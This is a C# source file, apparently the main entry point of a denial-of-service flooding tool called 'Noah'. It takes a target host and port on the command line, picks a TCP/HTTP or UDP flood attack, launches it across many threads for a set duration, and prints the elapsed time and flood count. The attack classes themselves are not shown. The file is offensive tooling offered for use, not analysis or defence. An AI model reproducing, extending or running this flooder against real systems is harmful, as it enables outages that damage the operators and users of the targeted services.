using System;
using System.Threading;

using Noah.Attacks;

namespace Noah
{
    class MainClass
    {
        private static ApplicationState state;
        public static void Main(string[] args)
        {
            state = new ArgumentParser(args).Parse();
            state.AttackCompleted += state_OnAttackCompleted;
            IAttack attack = null;

            switch (args[0].ToLower())
            {
                case "tcp":
                    attack = new HTTPAttack(state, args[1], state.Port);
                    break;
                case "udp":
                    attack = new UDPAttack(state, args[1], state.Port);
                    break;
            }

            for (int i = 0; i < state.Threads; i++)
                attack.BeginAttack();
            Thread.Sleep(state.TimeAllocated);
            state.State = States.Done;
        }

        private static void state_OnAttackCompleted(object sender, AttackCompletedEventArgs e)
        {
            if (state.ShowTime)
                Console.WriteLine("Total elapsed time: " + state.StopWatch.Elapsed.Seconds);
            if (state.ShowFlood)
                Console.WriteLine("Total flood count: " + state.FloodCount.ToString());
            Environment.Exit(0);
        }
    }
}